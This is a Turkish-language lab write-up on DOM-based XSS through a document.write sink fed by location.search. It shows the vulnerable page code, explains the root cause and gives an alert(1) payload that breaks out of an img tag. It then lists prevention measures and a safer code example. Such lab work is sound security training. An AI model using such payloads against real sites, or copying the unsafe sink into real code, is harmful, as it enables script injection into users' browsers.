# DOM XSS in document.write sink using source location.search

## Lab Açıklaması
Bir arama işlevindeki DOM tabanlı Cross-Site Scripting (XSS) zafiyetini analiz etmek.

---

## Analiz

### Zafiyetin Keşfi
- Arama bölümündeki bir parametre URL'ye yansıyor
- Zafiyet, kaynak kodunun kullanıcı girdisini nasıl işlediğinde yatmaktadır

### Zafiyetli Kod
```html
<section class=blog-header>
    <h1>0 search results for 'test'</h1>
    <hr>
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

### Kök Neden
Zafiyet şu sebeplerle var:
- `search` parametresi URL'den `URLSearchParams` kullanılarak doğrudan çıkarılıyor
- Değer, hiçbir sanitasyon olmadan `trackSearch()` fonksiyonuna geçiriliyor
- `document.write()` metoduyla query parametresi, herhangi bir encoding veya validasyon olmaksızın `<img>` etiketine enjekte ediliyor
- Bir saldırgan `<img>` etiketinden çıkıp keyfi HTML/JavaScript enjekte edebilir

---

## İstismarı

### Attack Vektörü
İnjection noktası `<img>` etiketidir:
```html
<img src="/resources/images/tracker.gif?searchTerms='+query+'">
```

### Payload
Bu zafiyeti istismar etmek için:

1. `<img>` etiketini `">` ile kapat
2. `<script>` etiketi kullanarak kötü amaçlı JavaScript enjekte et
3. Kalan kodu devam ettir

**Payload:**
```
"><script>alert(1)</script><img src="/resources/images/tracker.gif?searchTerms="
```

### Nihai İnjection
Oluşan HTML şu hale gelir:
```html
<img src="/resources/images/tracker.gif?searchTerms='"><script>alert(1)</script><img src="/resources/images/tracker.gif?searchTerms="+'">
```

---

## Sonuç

✅ **Lab Başarıyla Tamamlandı**

Sayfada bir pop-up alert görünür ve DOM XSS zafiyetinin başarılı bir şekilde istismar edildiği doğrulanır.

---

## Önleme Yöntemleri

Bu zafiyeti önlemek için:
- **`document.write()` asla kullanma** - kullanıcı verisiyle
- **Output'u encode etme** - uygun HTML entity encoding kullanarak
- **Safe DOM metodları kullanma** - `innerHTML` yerine `textContent` gibi
- **Content Security Policy (CSP) headers** uygulama
- **Tüm user input'larını validate ve sanitize etme**

### Güvenli Kod Örneği
```javascript
function trackSearch(query) {
    const img = document.createElement('img');
    img.src = '/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(query);
    document.body.appendChild(img);
}
```
